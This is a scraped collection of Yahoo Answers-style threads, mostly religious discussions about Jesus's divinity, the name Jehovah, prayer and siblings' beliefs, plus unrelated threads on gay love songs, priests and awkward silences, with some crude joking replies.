There are a lot more chapters and verses mentioned in the below website along with music, speeches and praise and worship.    http://jesustrinity.blogspot.com    Jesus is God. He is alive forever.    The questions usually asked are:-    1) Did Jesus really exist?  2) Is Jesus God?  3) If Jesus is God, then why did He keep praying to the Father in Heaven? How can the Father and Jesus be one God? Why did Jesus have to suffer on the Cross?  4) What is the Holy Spirit?  5) What is so special about Jesus? Why cant I just view him as an ordinary man or a teacher or a prophet? Why should I see him as God?      It would not be possible to give a short answer to these questions .    I suggest you visit the below website.    After visiting the below website, you would get a lot of answers.    http://jesustrinity.blogspot.com    1.Thomas calls Jesus God in John 20:28 (Note, Thomas addresses Jesus  specifically.)  2. Jesus is God in Heb. 1:8  3. John the apostle states that Jesus was the Word which was God that became  flesh (John 1:1-14)  4. The phrase "Call upon the name of the LORD" (Hebrew, YHWH, i.e., Psalm  116:4) used only of God on the OT, and translated into the Greek in the LXX as  "Call upon the name of the LORD (greek, KURIOS)," applied to Jesus in the NT  (1 Cor. 1:2) Jesus is God in flesh  5. The apostle John says that Jesus was , "...calling God His own Father,  making Himself equal to God," (John 5:18)  6. Jesus said that He and the Father are One (John 10:30), that caused the Pharisees to  claim that Jesus was making Himself out to be God.  7. Jesus knew all things (John 21:17)  8. Jesus knew all men (John 16:30)  9. Jesus is everywhere (Matt. 28:20)  10. Jesus Christ, dwells in you (Col. 1:27)  11. Jesus is the exact representation of the Nature of God (Heb. 1:3)  12. Jesus is eternal (Micah 5:1-2)  13. Jesus gives eternal life (John 10:27-28)  14. Jesus is our only Lord and Master (Jude 4)  15. Jesus is called the Mighty God (Isaiah 9:6)  16. Jesus is called the Mighty God (Isaiah 9:6) and "God" also be called the  Mighty God in Isaiah 10:21  17. Jesus is able to raise Himself from the dead (John 2:19-21)  18. Jesus created all things (Col. 1:16-17), it is God who created all things  by Himself (Isaiah 44:24)  19. Jesus searches the hearts and minds of the people (Rev. 2:23)  20. Jesus is worshiped (Matt. 2:2-11; Matt.14:33; Matt.28:9; John 9:35-38;  Heb. 1:6) Only God can be worshipped (Matt. 4:10) (same Greek word for worship  is used in each place.)  21. In the OT God was seen (Exodus 6:2-3;Exodus 24:9-11; Num. 12:6-9; Acts  7:2), yet no man can see God (Exodus 33:20; John 1:18). It was not the Father  that was seen in the OT (John 6:46). Who, then were they seeing? See John  8:58.  22. Jesus claimed the divine name, "I AM", for Himself in John 8:58 see  Exodus 3:14.  23. Jesus says you must honor him even as you honor the Father (John 5:23).  24. Jesus gives life (John 5:21).  25. Jesus bears witness of Himself (John 8:18;John 14:6).  26. Jesus is the One who will judge you on judgement day (John 5:22-23). Only God can be the judge.  27. Jesus forgives sins (Luke 5:20) (Luke 24:47,Acts 10:43) .Only God can forgive sins.    http://jesustrinity.blogspot.com|`|LjsRfaskaa	In my tradition we call the Creator the 'Great Grandfalther of all'.

If God was any different than that, it would make him a contradicition in terms, an oxymoron.    All matter is interconected and a part of the same universal consiousness.

Like any translation of a name it changes.  For example Joseph in English means Jose'  in Spanish.  Yeshua has been translated from Hebrew to Jesus in English and everyone uses that.  John 17:5-8   Matthew 6:10 Jesus own words to his father:Our Father in the heavens let your name (father)be sanctified. Father is simply a title,not a name.    God has a name and it is in his word the Bible for us to use. 2 Peter 1:20   2 Timothy 3:16 In the back of my King James Bible in the dictionary it says Yahweh The covenant God of Israel, YHWH in original Hebrew.According to Jewish custom,because of reverence the divine name was not to be spoken so the Hebrew words for Lord and God were substituted.Whenever the words Lord and God appear     in large and small capital letters the original Hebrew reads YHWH  The same translation tells me Jehovah:  The Lord,God used by some Bible translators for the name of the covenant God of  Israel,  Exodus 6:3 Psalm 83:18 Isaiah 12:2 Isaiah 26:4   Tetragrammaton The four letters YHWH forming the sacred name of the supreme Diety.Whenever the words Lord and God appear in large and small capital letters in the OT the original Hebrew texts uses YHWH .  Now sometimes written Jehovah.  Don't we associates the type of person with what their name is? For instance Hitler,  Jesse James ,Mahatma Ghandi.     We cannot have a friendship with anyone if we don't know their name.In fact that is the first start of a friendship learning another persons name.

Jehovah.|`|FByBcUeeaa	I just call Him Father or Abba.|`|AA10055448	Yes, of course, for "Jehovah" is a respectful pronunciation of the Divine Name. In its original form, the proper and personal name of Almighty God is:   ????    The four Hebrew characters are generally transliterated as "YHWH" (that is, each Hebrew character is directly replaced by a different character with the same sound in another language's character set).     It is true that the Almighty did not say, "Listen, thousands of years from now when a new language called English comes along, they can pronounce my name as 'Jehovah' and that's fine." Instead, like with any and every personal name, different languages TRANSLATE personal names to fit their lingual tendencies. George becomes "Hor-hey" in Spanish or "Gay-org" in German and no one gets upset.    The name "Jehovah" was not fabricated "from whole cloth" (as it were). As speakers of English find it easier to say "Jesus" than "Yeheshua", so "Jehovah" seems to have originated as an honest attempt to pronounce "the Tetragrammaton".    The bible teaches that a certain kind of person would disrespect the divine name.  .. ..(Psalm 74:18) The enemy himself has reproached, O Jehovah, And a senseless people have treated your name with disrespect.      The bible also teaches what would happen to those who refuse to use and honor the name of Jehovah.    (Malachi 2:2) If you will not lay it to heart to give glory to my name," Jehovah of armies has said, "I shall also certainly send upon you the curse    (Psalm 83:16-18) Fill their faces with dishonor, That people may search for your name, O Jehovah. 17 O may they be ashamed and be disturbed for all times, And may they become abashed and perish; 18 That people may know that you, whose name is Jehovah, You alone are the Most High over all the earth.    (Isaiah 52:5,6) The utterance of Jehovah, "and constantly, all day long, my name was being treated with disrespect. 6 For that reason my people will know my name      According to the bible, what must ALL people do with regard to Jehovah's name?    (Psalm 29:2) Ascribe to Jehovah the glory of his name.    (Psalm 86:8-9) There is none like you among the gods, O Jehovah, Neither are there any works like yours.  9 All the nations whom you have made will themselves come, And they will bow down before you, O Jehovah, And will give glory to your name.      The bible also teaches that there are real benefits for those who appropriately use the name Jehovah.    (Romans 10:13) Everyone who calls on the name of Jehovah will be saved    (Acts 2:21) And everyone who calls on the name of Jehovah will be saved.    (Joel 2:32) And it must occur that everyone who calls on the name of Jehovah will get away safe    (Malachi 3:16) And a book of remembrance began to be written up before him for those in fear of Jehovah and for those thinking upon his name.    (Nehemiah 1:11) Jehovah, please, let your ear become attentive to the prayer of your servant and to the prayer of your servants who take delight in fearing your name      Who can reasonably be called "a people for Jehovah's name"? What does the bible say about this people?    (Isaiah 43:12) There was among you no strange god. So you are my witnesses," is the utterance of Jehovah, "and I am God.    (Zephaniah 3:9) I shall give to peoples the change to a pure language, in order for them all to call upon the name of Jehovah, in order to serve him shoulder to shoulder.    (Micah 4:5) For all the peoples, for their part, will walk each one in the name of its god; but we, for our part, shall walk in the name of Jehovah our God to time indefinite, even forever.    (Isaiah 52:5-7) The utterance of Jehovah, "and constantly, all day long, my name was being treated with disrespect. 6 For that reason my people will know my name... 7 How comely upon the mountains are the feet of the one bringing good news, the one publishing peace, the one bringing good news of something better, the one publishing salvation    (Malachi 1:11) For from the suns rising even to its setting my name will be great among the nations, and in every place sacrificial smoke will be made, a presentation will be made to my name, even a clean gift; because my name will be great among the nations," Jehovah of armies has said.      Here are some additional Scriptures that mention God's personal name. There are THOUSANDS MORE. Do any of these seem to imply that the name "Jehovah" is unimportant?  .. ..(Psalm 148:13) Let them praise the name of Jehovah, For his name alone is unreachably high.  (Micah 5:4) He will certainly stand and do shepherding in the strength of Jehovah, in the superiority of the name of Jehovah his God  (Psalm 9:10) And those knowing your name will trust in you, For you will certainly not leave those looking for you, O Jehovah.  (Psalm 34:3) O magnify Jehovah with me, YOU people, And let us exalt his name together.  (Zephaniah 3:12) A people humble and lowly, and they will actually take refuge in the name of Jehovah.  (Revelation 15:4) Who will not really fear you, Jehovah, and glorify your name, because you alone are loyal?. . .  (Micah 6:8,9) And what is Jehovah asking... the person of practical wisdom will fear your name.  (Psalm 96:2) Sing to Jehovah, bless his name.  (Psalm 105:1) Give thanks to Jehovah, call upon his name, Make known among the peoples his dealings.  (Psalm 54:6) I shall laud your name, O Jehovah, for it is good.  (Micah 4:5) For all the peoples, for their part, will walk each one in the name of its god; but we, for our part, shall walk in the name of Jehovah our God to time indefinite, even forever.  (Psalm 118:26) Blessed be the One coming in the name of Jehovah  (Matthew 21:9) Blessed is he that comes in Jehovah's name!  (Matthew 23:39) Blesse|`|47181414a475aa26d8316adbb0d510d1aa	Even you don't JUST USE the term 'Father'.    In your question you used the title 'God'.  Which is he your God or your Father?    We know the answer to is is "Both"    When I pray and want to use his title Father, I do.    When I am talking about my God, and I don't want people to be confused with just any God, I use Jehovah.    When I call out for salvation, I obey Peter when he said "Everyone who calls upon the name of Jehovah, will be saved."    Act 2:21 And it shall come to pass        That whoever calls on the name of the Jehovah [LORD]        Shall be saved.    Notice what Jesus said:    Rev 3:12 He who overcomes, I will make him a pillar in the temple of My God, and he shall go out no more. I will write on him the name of My God and the name of the city of My God, the New Jerusalem, which comes down out of heaven from My God.     Do you use the name of Jesus' God?    Have you made His name known?    John 17:  26 And I have declared to them Your name, and will declare it,    Have you glorified Jehovah's name?    John 12:28"Father, glorify Your name " Then a voice came out of heaven: "I have both glorified it, and will glorify it again."     Have you made God's name holy?    Matt 6:9"Pray, then, in this way:           'Our Father who is in heaven,           Hallowed be Your name.         You in effect have stated,  I would rather use the titles God and Father than to use God's name.    And yet Jesus came to take people out of all nations for God's name.    Acts 15:14"Simeon has related how God first concerned Himself about taking from among the Gentiles a people for His name.    .
rGEZup0Zaa	Sorry.    The words passion, bridle, and shower with reference to you has completely wrecked my thought process.    Were you saying something?|`|NlzlBV8Haa	Yes yes.  Sex.  That's your distraction du vie isn't it?|`|k3LbhASGaa	after seeing your avatar I need a cold shower|`|evStsOQiaa	Just pray that you don't drop the soap.|`|3ibsZ4mTaa	If you also flog your back, yes.|`|buly56vFaa	Maybe, but why would you want to bridle the burning passion? Its great for your health.|`|uz9GtV9vaa	Yeah, that burning isn't passion you're feeling...|`|UyDkYaXuaa	Gosh your boobies are big =O|`|J7KSKm54aa	Probally|`|bticQDIhaa	No, you should just give in to your unbridled passion. And tape it.|`|tzz0BG8yaa	Don't you mean your burning passion for Sham-Wow? You know you can't resist me.

There are almost no children in prison!|`|GKJEgidzaa	There are so many sick people in the world.    In fact, the world is generally a big mess, we ruined it.|`|HIskrREJaa	not very many.. but there are quite a few in the jemez mountains here in new mexico so they can be "reformed". it's right down the road from hummingbird music camp. go figure.|`|zzivfC0qaa	Less then the ones committing their sick crimes.|`|51fe01ef6db0c1bd743afcb3e7a2e1ffaa	I give up - how many?|`|jj9G0BBraa	You're right. Just because you serve God does not mean that you exempt from earthly punishment.They should be made to pay the fullest that the law can bring to bare on them.|`|K24JFTOcaa	for some reason the church protects them, i never understood that|`|b8e321f3ad0d1eae90c1058863af7856aa	money makes the world go around..and the Catholic church is loaded...they are closing churches down to hang on to some of the money because the churches are empty....Babylon the great...the empire of false religion is taking it's last breaths....Study with Jehovah's Witnesses and find out what God really expects of us...and how he wants to be worshiped.|`|XCHoHCrnaa	Report the ones you know and they will face trial.    If not the will face St James at the gates ;-) x|`|aCdya2qkaa	there is too many mate. they should be hanged like victorian times|`|MTZTJc92aa	Not Many.I don't think it's because there above the law but catholics believe that it is a sin induced by satan so they are only answerable to god. Personally i think they shouldn't be protected should be accountable like the rest of society.|`|Bh82isDSaa	Hello........., I don't know where to look to find out how many are in prison, but we say the computer has all the information we ever need so one could probably research that for the next six months to find out. What is certain is that many people are responsible for letting that happen.  Every one of them had supervisors and were educated people who should have known it was happening. No one has a right to abuse anyone in life, much less innocent boys. What is wrong today is making it right to make many dollars from it as the church suffers for this failure to seek out the problem. I think a better question is "How many of the victims have or are getting psychiatric help for this travesty? I suspect once the lawyers got their share, not much was done for the victims.  A very sad commentary on our culture and the neglect of the Catholic leadership.|`|bfuYiSxfaa	not many, they work for God?? you lost me!    my question would have been, ' why are so many Priests beyond the law?'|`|X3PmWPUraa	not enough!!
HG5Smxkjaa	I heard that on a Christian radio broadcast a few weeks ago....but didn't get a chance to write it down....Thank you for posting this....and yes I believe God did this with intent!....|`|G49lKR56aa	God has rhyme and reason! Everything he has ever did is for a purpose!     Even though I can't vote twice I'd give any answer like "that's cool" or " Amen" or "Right on Brother", something of that sorts a two thumbs up!|`|Rn4GXoJAaa	I can beat that.    Shakespear was 46 when the King James bible was translated.    Go to Psalm 46.    Count 46 words from the start = shake  Count 46 words from the end = spear.    But wait, there's more!    Ok, now add 4 + 6 = 10    Verse 10, words 4 and 6 = I (am) will.    Or, will I am.  Or, william.      as in, william shakespear.        yeah, its just a coincidence...chapters and verses are a modern concept.    ...except the rabbis say, coincidence is not a kosher word :-P|`|6lJuKKMHaa	Cool!  Thanks!  :)|`|KM5MNRJmaa	i've heard that before. cool eh?|`|b2bMy1EAaa	Your talking about a book that has been written by men. Books have been removed from it over the years. That equation would not have worked with the original bible as it would have been a hell of a lot longer. Anybody can create patterns.|`|0fEBJinjaa	Nice try. Pity that the Qur'an also has many number patterns in it. Look them up, it's quite interesting.|`|USd2LAOUaa	If you are trusting the bible ...you are trusting a book written by men...|`|db7df25ea31227e5641d5c32d43c3bcdaa	do not know|`|ouXrNitMaa	My version of the Bible says    PSALMS 118:8 "Stop wasting your time hunting for coincidences. It makes you look desperate to prove something to yourself."|`|7CoVXfA1aa	Hehe that's cool, I didn't know that.  (However you must have a lot of time on your hands to spend all that time adding! lol)|`|UD7d70awaa	I love God.|`|lVSDB0Hwaa	Like omg, you totally convinced me that the bible is the infallible word of the lord! Praise God!|`|WjRqYf6naa	Actually, that is not quite correct. The Bible has 31,174 verses, so there cannot be one "middle" verse There are actually two verses at the middle, Psalms 118:8-9    Psalms 118:8  It is better to take refuge in the LORD than to trust in man.   Psalms 118:9  It is better to take refuge in the LORD than to trust in princes.       Also, it is noteworthy that this is only true for the King James version, as some versions have more or fewer verses.    Also, the center chapter is Psalms 117, as it is both preceded and followed by 594 chapters.    Our faith in God does not rest upon numbers games, it rests upon the perfect sacrifice of Christ Jesus for our sins.    God bless.|`|lDbNf3h9aa	Try these sites.

I also wear men's pajama pants    I've been wearing men's boxers since I was 12 and my parents were making fun of me for being a stick in the mudd, calling me "Michael J Fox" from his character on some tv show ?Family Ties? because I was such a prude-wouldnt wear any bright colors, never wanted to stand out in a crowd, never had any fun- so they bought me boxers for my b'day-I found them to be comfortable and have been wearing them ever since! The flannel ones work great to keep the bum nice and warm!|`|62eb64f00529ec4e271b0beecf4776c0aa	I do.

LJlaHLQdaa	MATTHEW  6:33  But seek ye first the kingdom of God, and his righteousness; and all these things shall be added unto you.     MARK  1:15  And saying, The time is fulfilled, and the kingdom of God is at hand: repent ye, and believe the gospel.     JOHN  3:3  Jesus answered and said unto him, Verily, verily, I say unto thee, Except a man be born again, he cannot see the kingdom of God.     JOHN  3:5  Jesus answered, Verily, verily, I say unto thee, Except a man be born of water and of the Spirit, he cannot enter into the kingdom of God.     ACTS  28:31  Preaching the kingdom of God, and teaching those things which concern the Lord Jesus Christ, with all confidence, no man forbidding him.     ROMANS 14:17  For the kingdom of God is not meat and drink; but righteousness, and peace, and joy in the Holy Ghost.     1 CORINTHIANS  4:20  For the kingdom of God is not in word, but in power.     1 CORINTHIANS  6:9  Know ye not that the unrighteous shall not inherit the kingdom of God? Be not deceived: neither fornicators, nor idolaters, nor adulterers, nor effeminate, nor abusers of themselves with mankind,     1 CORINTHIANS  6:10  Nor thieves, nor covetous, nor drunkards, nor revilers, nor extortioners, shall inherit the kingdom of God.     1 CORINTHIANS  15:50  Now this I say, brethren, that flesh and blood cannot inherit the kingdom of God; neither doth corruption inherit incorruption.     GAL 5:21  Envyings, murders, drunkenness, revellings, and such like: of the which I tell you before, as I have also told you in time past, that they which do such things shall not inherit the kingdom of God.     ______________________________________...        "Thy kingdom come. Thy will be done in earth, as it is in heaven." The whole life of Christ upon earth was lived for the purpose of manifesting the will of God on earth as it is in heaven. Said Christ, "Except a man be born again, he cannot see the kingdom of God. . . . Except a man be born of water and of the Spirit, he cannot enter into the kingdom of God. That which is  born of the flesh is flesh; and that which is born of the Spirit is spirit."     The King shall answer and say unto them, Verily I say unto you, Inasmuch as ye have done it unto one of the least of these my brethren, ye have done it unto me. Matt. 25:40.      What satisfaction will every reaper have, when the clear, musical voice of Jesus shall be heard, saying, "Come, ye blessed of my Father, inherit the kingdom prepared for you from the foundation of the world." "Enter thou into the joy of thy lord."      We shall greet the holy family of the redeemed, and hear the words of Christ, "Come, ye blessed of my Father, inherit the kingdom prepared for you from the foundation of the world." We shall touch our golden harps, and heaven will ring with rich music. We shall cast our glittering crowns at His feet, and give glory to Him who has overcome in our behalf.|`|Bh82isDSaa	Good for you Birdie. You're getting the right idea. It is all about a relationship, then you will inherit  the Kingdom.  You should always wish for it, and you will get your wish if  you live like the King of the Kingdom where you want to go.  Also, you need not worry about being a peasant. Everyone will love you no matter what label you want to put on yourself. We are loved equally and unconditionally.   God Bless.|`|AA10192697	The meaning of "inherit the Kingdom of God" means that you will receive entrance through the gates of Heaven and live there with God forever and ever.  We are God's children (creation) and He is the King of Heaven and everlasting life. Through faith, good deeds, obedience, we have the right to be in Heaven with our Father. We won't 'own' any part of it. Just live there forever.  And the only way to enter the gates of Heaven is to believe in the Godhead (Holy Trinity) and believe and trust in Jesus Christ as your Savior. Through Jesus, you will be saved and enter Heaven.|`|Sx6vlEUbaa	Those that are heirs of the Kingdom of God have yet to inherit it. That will take place at the resurrection. There are no peasants in God's Kingdom. Only Children in God's eternal family.|`|rz4AUvbaaa	Know that you are to inherit, and wishing is nothing.  Divine Love never made a peasant.  :)|`|KmnbjZIdaa	If you have true faith in God, then you already have the kingdom of God in your heart.  Its fullness however will come at the second coming of Christ.|`|nIu8zVkXaa	Your reward as a Christian is the inheritance of the Kingdom of God.  Read James 2:5.  "Hearken, my beloved brethren.  Hath not God chosen the poor of this world rich in faith, and heirs of the kingdom which he hath promised to them that love him?"    Also, read Mathew 5:3-12 and Mathew 25:34.  Hope this encourages you to long for that day.
eGtZXgRHaa	Try this one... the singer's a lesbian, and I think the song is wonderful... even though it could fit any straight couple too ;) I like the idea that she's talking about 2 girls... Anyways ! Here it is ;)    The Weakness In Me by Joan Armatrading    http://www.youtube.com/watch?v=swTrjqOpd...|`|2gyJUTzRaa	YES!  I know how you feel...it pisses me off.  Have you heard "Not Gonna Get Us" or "All the things she said" by Tatu.  Those are songs about lesbian love.  Aside from that I can't really think of any others.  But you could really take any love song that doesn't mention gender, and it could be about gay or straight love.|`|GVw4WKaQaa	I'm fine with my techno =P  I'm sick of hearing love songs all the time it would have to be a pretty good song.|`|Dkylapi6aa	Of course! i love the song "Love Story" by Taylor Swift but i don't like how singing the boy and girl part so i just replace the lyrics. For example if it says Juliet i just replace it with my name. LOL.|`|YlMR42agaa	Sadly there are lesbian love songs and bi love song.    If you are a guy you will find love song more in the hip-hop genera  or glamor genera|`|PSzzjf4naa	Listen to Lola by the Kinks , Walk on the Wild side by Lou Reed , and All the Young Dudes by Mott -|`|mE1YiekAaa	um well you could listen to tatu, its a band that started out as a couple (they are two girls) i like um :D|`|MQjo7HLkaa	I like to enjoy music for music. I don't care if it supports one thing or another. As long as it sounds good.    If you want, try to listen to songs that have nothing to do with sex or sexual orientation ^-^ that'll make you feel better.|`|9J43pXtIaa	i dedicate songs all the time to this girl im completely in love with...  just to name a few:  "Can I have this dance?" from the High School Musical 3 sdtk.  "Beautiful" by Akon.  "Single" by Neyo.  "Sexy Love" by Neyo.  "Nice&Slow" by Usher.  "O" by Omarion.  "Next Go Round" by Nickelback. (:|`|0xz8mR2xaa	Uh, that's basically what Jay Brannon writes about. Pansy Division does goofier ones, too. Groups like Tribe 8 and Team Dresch have wrote very hot and or sweet songs about love (download Romeo and Julio!) Not quite a love song, per se, but Bronski Beat provided the anthem for gay youths in the 80's. There's music... you just need to start listening to gay and queer artists.    UPDATE:  There's also that club single, "fa*goty attention." Forget the artiste, but there's a Youtube video for it.    UPDATE II:  Get Jet Boy, Jet Girl, by The Damned. It's a really cute tune about two teenage boys in a love not to be. Hard to fathom that it came out nearly thirty years ago, because it's still rather provocative.|`|3FOmoaUZaa	I bet there r .... somewhere.  U need to read Walt Whitman. He was a poet who wrote about gay love.|`|AA11303263	Yes, there should be songs like:     "Rub Crisco on my Heart"   "Wind beneath my chaps"   "Craigslist Lover"  "You are the Sequins in my life"   "My Lover doesn't like Labels"  "I thought you were a man"  "I love you but your clothes don't fit me"    and my personal favorite:  "My wife is out of town this weekend"|`|auiCxp2faa	iiiiiiiiiii kisssseddd a girrlll and i likeedddd itttttt    (they also have "i kissed a boy" where a boy sings it..its kinda oddish though..)
AA11297267	Yeah, my brother's a hard-core mormon, moving his way up through the church leadership.    Funny thing is, my sister (like me) realized the absurdities of the mormon church and bailed...only to become a born-again christian.  I tell her she gave up one fantasy for another, but she doesn't see it and insists she left those crazy mormons but found *THE TRUTH.*    So I'm the only rational child in my family :(    Hey, my son's 12 -- is your sister cute?  If so, let's educate her instead of hoping she goes lesbo, and fix 'em up -- what do you say?  The deal's off if she stays deluded, though...    Peace.|`|QwKiK85eaa	Yes my sister is a christian and my mom is a strong christian along with my brother my dad is I dunno lol he isn't really religious. My little brother doesn't really understand the concept of being an Atheist because he always calls me atheist lover ?_? and my sister is really annoying she tries to get me saved by bringing me to her church and turning on gods gonna save me lol I would love to punch her|`|bRLCxmP6aa	I have three brothers and a sister - I'm the oldest. My sister, my oldest brother, and I were all raised Catholic, while my two younger brothers were raised Presbyterian.   Of the five of us, my sister generally believes in god and her partner is a Catholic, my youngest brother is an atheist and anarchist, my middle brother is a very liberal, loosely-Presbyterian environmentalist married to a vegetarian pagan who was raised as a devout Lutheran, my oldest brother is a devout born-again Christian, and I'm an agnostic.   My father (a former Catholic) believes in god but doesn't have a religion. My step-father (a Presbyterian) believes, but isn't church-going.   Only my mother, who leans towards evangelical Christianity, gives me a hard time about raising my son without a religion. The rest of us happily accept and respect one another's beliefs.|`|rGEZup0Zaa	No, I don't.    My brother is an atheist.|`|dcDY9pJeaa	My bro is a non-believer like me|`|Kom3K4a8aa	So you hope your little sister goes away from her own beliefs, to please you?

Fortunately, after many discussions with me, he eventually realized the fallacy of religion.|`|AA11595906	A star for you, my friend.  I have 5 brothers and sisters and they are all religious|`|d8XND5ngaa	They don't bother me with it. They live half way across the country from me.|`|3306acbb7100c0f39897a04c473a7708aa	My older brother is a youth minister.  He has such a superiority complex.|`|176PIYNVaa	Yes, I do.  I know they are sad and afraid of not seeing me in their heaven but they never think any less of me. They respect and love me just the same. And I don't intend to take away their inner peace as theists.|`|AA11709855	My family and relatives are Christian / Catholics. I'm the FIRST atheist that came about in the family pedigree.|`|cEerFO38aa	I'm a spoiled only child :P    But, I have a cousin who is very, very religious. Also, my boyfriend's family is incredibly religious. Smiling and looking down shyly goes a long way, apparently. LOL!|`|ePMLU3Vmaa	Nope thankfully. I dont have any siblings|`|FeUmyxqqaa	some are very religious, they are othodox which isnt as bad as the enhanced religions, there were some catholics but they got their freedom and now think church is what it is|`|2ogimlBxaa	Man, little religious kids can be hilarious.

When they pray....I bow my head out of respect to them.|`|nooi0ldjaa	ha ha nope, but the rest of my family is like...uber religious.  the kind of people that make you scared to even think of bringing "god" up...    "I SO hope she goes lesbian someday..."    c'mon man she's your sister!...|`|QAGaQUDRaa	Yes I do.....she used to say I was  going to Hell for not going to church. I don't know where she got all her religious-ness (haha) from, because my parents are pretty laid back about theirs.    Oh well...she's the one whose son is out sleeping with everything that has 2 legs.|`|rbdZQOGzaa	Yes, I have a younger sister that still believes in the Christian faith. But i've noticed a tendancey for her to learn more toward the Virgin Mary instead of  Jesus.   We had our jabs at each other. She once said I was going to hell and all but that was years ago when we were still in school. She's cool with my choice now.|`|kVDGsDuZaa	I only have one brother, two years younger than me. He is Catholic,  like everybody else in my family, but doesn't practise it much, and doesn't bother me, or anyone, about religion.|`|Gsd4VD13aa	I suppose you could call my sister religious, though that doesn't quite fit. She believes in a god of some sort, and it tends to run along Christian lines, but I'm not sure I'd say that she's Christian. She tends to think Christian practices are moronic and can't stand the closedminded hypocritical hatred that comes from its followers.    Let me put it this way...     She was in a car crash that almost killed her about 11 years ago. At that time I did a healing spell for her and she went from "critical" to "safe" (or whatever the terminology is) by the next morning.    Not sure if the spell had anything to do with it or not. Probably not. I was alot younger then and don't think I'd do the same again, mostly because I don't think it really means anything.    I told her about it years later. I was afraid she'd be very upset. Her reaction surprised me. She said "thanks, I could have used all the help I could get".    My sister and I are like night and day (almost litterally. You wouldn't know we're sisters to look at us), but she's a wonderful woman.    I have no brothers.|`|NCRfZRopaa	My two older brothers are somewhat religious.
mfZxsGEXaa	For awkward silences yell "poop!" or "a gay baby was born!"   to keep a conversation rolling, I always ask someone about themselves, or a topic that i know they like.      Everyone loves talking about themselves.|`|3iNobwVraa	I don't view silence as awkward, USUALLY.  If I think it feels awkward, it won't be silent because I can always come up with random tidbits of things to talk about.  But, if I am comfortable with someone, I totally appreciate being able to just live with the silence for a moment.  That, to me, is far rarer, and far more appreciated than random comments.|`|J8ms1wbZaa	i usually just say something funny or random, just to keep the conversation going, you never know what a random blurt of words will lead to|`|b7246aa9c54ecf3cf12beff32046d863aa	smile !|`|Q3WweuOCaa	I say, " what do you think of my glasses?"  Always works....or I say, "You smell nice, wanna get a beer?"  Even to men.|`|KBVAbwUXaa	I do voice impersonations of cartoon characters. There's never a dull moment in my conversations, you'll just end up laughing. It's only an uptight situation that causes silence, and that falls upon the people who converse
dFBccLExaa	Yeah, I've noticed that more and more R&S-ers have wandered over here. I hope the trend stops, because I don't want this turning into the RS board, where people spend more time attacking one another, instead of actually answering questions.|`|o1yy6KABaa	Im with you on this one, there is a reason why religion has its own category, it doesnt belong here!|`|oTwymgpIaa	Because Atheists feel it is there duty to inform everyone that religion is nothing more than folklore. ;-)|`|8k6kxOh2aa	it's typically people without religon that choose to look upon all religons as false that post questions here that should belong in the r&s section.|`|BvY47ts6aa	Simply because Mythology is about ancient religion(s). Myth is defined as sacred writings, mythology basically is the study of sacred writings.|`|xRCynGQqaa	I hang out in both sections. I haven't noticed this trend you speak of.    But you could argue that religion is mythology.    And it was always a battlefield between the believers (in mermaids, vampires, ghosts etc) and skeptics. So, even if it is true, it's nothing new.|`|K6ij0udraa	because most of the time, things that aren't true usually have their root in something that is true. even though M&F is technically defined as untrue and made up, theres gotta be some stitch of truth in it somewhere. so people think that it could help explain religion.

Edit: I don't think that there is anything spiritual about it.|`|xbw8P3Rsaa	S of S is a text of Solomon describing his love and affection for a bride of his.

Pro forma prayers are really not going to accomplish much; God has heard them a billion times already.    Why pray?  It's a wonderful opportunity to thank him for what we have (if he didn't give it to us, he didn't keep it from us, either), and to ask him for his help in obtaining what we need.  I'll take all the help I can get, and in my life, encouragement, hope, and optimism are rare commodities.|`|HDyqzvUkaa	Pray is a ritual.    The ritual is intended to summon a deity to aid the summoner in his travels.  This can be done simply by concentrating on the image and essence of the deity.|`|r8rykCkGaa	Talking to God, but in order to make it true prayer in the spirit, we should always thank the Lord and praise and worship.  Our prayers should be honoring to Jesus.  When we ask for something, we would be in divine order to thank him before we get the answer.  This is an act of faith and respect towards our holy creator, and he will give us the peace and bless us for honoring him.  All prayer should be in the will of God and with the right motivations.|`|m09snBrEaa	an attempt to communicate with a god or deity in order to either pay respect to, or ask favors from.    there isn't any real demonstrable evidence to suggest that praying will actually work. so it really depends on what you are praying for.|`|3306acbb7100c0f39897a04c473a7708aa	it's talking to  yourself asking for something.

The fifteen promises of Mary to Christians who recite the rosary:  1. Whoever shall faithfully serve me by the recitation of the Rosary shall receive signal graces.  2. I promise my special protection and the greatest graces to all those who shall recite the Rosary.  3. The Rosary shall be a powerful armor against Hell, it will destroy vice, decrease sin, and defeat heresies.  4. It will cause virtue and good works to flourish; it will obtain for souls the abundant mercy of God; it will withdraw the hearts of men from the love of the world and its vanities and will lift them to the desire of eternal things. Oh, that souls would sanctify themselves by this means.  5. The soul which recommends itself to me by the recitation of the Rosary, shall not perish.  6. Whoever shall recite the Rosary devoutly, applying himself to the consideration of its sacred mysteries, shall never be conquered by misfortune. God will not chastise him in His justice, he shall not perish by an unprovided death; if he be just, he shall remain in the grace of God and become worthy of eternal life.  7. Whoever shall have a true devotion for the Rosary shall not die without the Sacraments of the Church.  8. Those who are faithful to recite the Rosary shall have during their life and at their death the light of God and the plenitude of His graces; at the moment of death, they shall participate in the merits of the saints in Paradise.  9. I shall deliver from Purgatory those who have been devoted to the Rosary.  10. The faithful children of the Rosary shall merit a high degree of glory in Heaven.  11. You shall obtain all you ask of me by the recitation of the Rosary.  12. All those who propagate the Holy Rosary shall be aided by me in their necessities.  13. I have obtained from my Divine Son that all the advocates of the Rosary shall have for intercessors the entire Celestial Court during their life and at the hour of death.  14. All who recite the Rosary are my sons, and brothers of my only Son, Jesus Christ.  15. Devotion to my Rosary is a great sign of predestination.|`|nIu8zVkXaa	Prayer is how we communicate or fellowship with God the Father.  It is about relationship more than anything.  That is why when you see someone that you know loves God above all else, you can be absolutely sure they have a strong prayer life.  I do not know how anyone can get through a day without prayer.  I know they do but when I don't take time to pray before my day begins, it's one of the hardest of all days to get through.  I get strength from God when I pray and I ask questions and he answers though not in an audible voice.  He usually answers my questions when I'm studying my Bible.|`|cESjwZzVaa	Some people think that it is a communication with God but some scientists believe that it is a way of transferring our energies. A study showed that people in hospitals seemed to heal faster when they had a group of people pray for them. It was probably not communicating with gods, it was more like transferring positive energies to the ill.|`|zhzTfyXcaa	Prayer is a way to communicate to God. You use the phone on earth etc and that is how we talk to people but when it comes to God, we just talk outloud usually closing our eyes and focusing on Jesus Christ, who we are talking to. Prayer is a why to show your love to God and its just like talking. Why not talk to your God you know? God loves you and he wants to listen!|`|97oxJ0B8aa	Asking.  Why, it gets you to the point of caring enough for God to Act.  That's something I've come to believe through experience.  Prayer changes your heart.
